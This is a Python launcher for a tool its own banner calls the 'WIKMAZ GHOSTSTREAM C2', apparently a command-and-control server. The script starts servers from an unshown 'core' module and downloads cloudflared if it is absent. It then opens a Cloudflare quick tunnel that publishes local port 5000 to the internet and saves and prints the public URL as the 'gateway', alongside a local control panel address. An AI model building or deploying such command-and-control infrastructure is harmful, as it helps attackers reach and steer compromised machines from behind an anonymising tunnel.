import os, sys, subprocess, time, re, platform, urllib.request, core

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

URL_FILE = os.path.join(BASE_DIR, 'data', 'public_url.txt')

def get_cloudflared():
    exe_name = "cloudflared.exe" if platform.system().lower() == "windows" else "cloudflared"
    exe_path = os.path.join(BASE_DIR, exe_name)
    if not os.path.exists(exe_path):
        u = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" if platform.system().lower() == "windows" else "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        urllib.request.urlretrieve(u, exe_path)
    return exe_path

if __name__ == '__main__':
    print("\n🚀 WIKMAZ GHOSTSTREAM C2 INICJALIZACJA...\n")
    core.run_servers()
    time.sleep(1)
    
    exe = get_cloudflared()
    p = subprocess.Popen([f"./{os.path.basename(exe)}" if platform.system() != "windows" else exe, "tunnel", "--url", "http://127.0.0.1:5000"], stderr=subprocess.PIPE, text=True, cwd=BASE_DIR)
    
    for line in p.stderr:
        m = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
        if m:
            os.makedirs(os.path.dirname(URL_FILE), exist_ok=True)
            with open(URL_FILE, 'w') as f: f.write(m.group(1))
            print("="*60)
            print("🔥 WIKMAZ BRAMKA:", m.group(1))
            print("🛠️  NEXUS PANEL: http://127.0.0.1:5001")
            print("="*60 + "\n")
            break
    while True: time.sleep(1)
